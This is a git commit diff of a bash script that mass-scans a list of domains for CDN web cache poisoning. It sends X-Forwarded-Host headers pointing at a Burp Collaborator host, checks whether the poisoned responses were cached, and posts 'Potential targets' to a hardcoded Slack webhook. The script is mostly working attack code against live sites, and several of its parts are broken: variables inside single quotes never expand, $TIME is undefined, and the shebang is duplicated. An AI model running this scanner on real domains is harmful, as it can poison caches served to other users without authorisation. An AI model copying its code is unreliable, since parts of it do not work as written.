9ba6f0165fef0db85d752c998f70900c7ee79a6e
Sambal0x <34885356+Sambal0x@users.noreply.github.com>
2019-11-07 00:27:27 +1100

    Update cache_poison_check.sh

--- cache_poison_check.sh
+++ cache_poison_check.sh
@@ -1,20 +1,41 @@
 #!/bin/bash
 # author: sambal0x
 # Purpose: To quickly check for potential CDN cache poisoning issues for a list of URLs
-#          This just assumes that the unkeyed header is X-Forwarded-Port, but its just to check for low hanging fruits
+#          This just assumes that the unkeyed header is X-Forwarded-Host, but its just to check for low hanging fruits
 #          Disclaimer : Use at your own risk!
-#          Reference: https://hackerone.com/reports/409370
+#          Reference: https://hackerone.com/reports/409370 , https://portswigger.net/research/practical-web-cache-poisoning
+# 		
 #################################################
 
-TIMEOUT=5 # seconds
+#!/bin/bash
+
+TIMEOUT=4 # seconds
+BURPCOL=w63ogwjvhnvnb5rqcyddg6zhu801oq.burpcollaborator.net
+SLACKHOOK=https://hooks.slack.com/services/TNZZT6H/BPW36KAaZ/Vf1OApKlXXXXX
+TIMESTAMP=$(date +%s)
+REFLECT=qwertyuiop
+
+RED='\033[0;31m'
+NC='\033[0m' # No Color
 
 for domain in $(cat $1); do 
-	baseline=$(curl -m 4 -s -o /dev/null -w "%{http_code}" https://$domain?baseline=1)  # baseline
-	s1=$(curl -m 4 -k -s -o /dev/null -w "%{http_code}" -H 'X-Forwarded-Port: 123' https://$domain?dontpoisoneveryone=1) # send poison req
-	s2=$(curl -m 4 -k -s -o /dev/null -w "%{http_code}" https://$domain?dontpoisoneveryone=1) # check poison req
-	echo "https://$domain, $baseline,$s1, $s2"
+	baseline=$(curl -m $TIMEOUT -k -s -o /dev/null -w "%{http_code}" https://$domain )  # baseline
+	s1=$(curl -m $TIMEOUT -k -s -o /dev/null -w "%{http_code}" -H 'X-Forwarded-Host: $BURPCOL:123' https://$domain?cachebuster=$TIME) # send poison req
+	s2=$(curl -m $TIMEOUT -k -s -o /dev/null -w "%{http_code}" https://$domain?cachebuster=$TIME) # check poison req
+	reflected=$(curl -i -m 4 -k -s -H 'X-Forwarded-Host: $REFLECT:123' https://$domain?reflect=$TIME | grep -c $REFLECT)  #check if host header reflected
+	output="https://$domain, $baseline,$s1, $s2, $reflected"
+	echo $output
 
-	if [ "$baseline" != "$s1" ] && [ "$s1" == "$s2" ]; then   # if baseline and poison request not same, and poison request is confirmed -> potentiall vulnerable
-		echo "[+] https://$domain is Potentially Vulnerable"
+	# if host header is reflected in response
+	if [[ "$reflected" != "0" ]] ; then   
+		echo -e  "${RED}[+] https://$domain - host header reflected.. Notifying via Slack${NC}"
+		curl -X POST -H 'Content-type: application/json' --data "{'text':'## Reflected host header in response ##\n$output'}" $SLACKHOOK &>/dev/null
+	fi	
+
+
+	# if baseline and poison request not same, and poison request is confirmed -> potentially vulnerable
+	if [[ "$baseline" != "$s1"  &&  "$s1" == "$s2"  &&  "$s1" != "000" && "$s2" != "000" && $baseline != "000" ]] ; then   
+		echo -e  "${RED}[+] https://$domain is Potentially Vulnerable.. Notifying via Slack${NC}"
+		curl -X POST -H 'Content-type: application/json' --data "{'text':'## Potential targets ##\n$output'}" $SLACKHOOK &>/dev/null
 	fi
 done
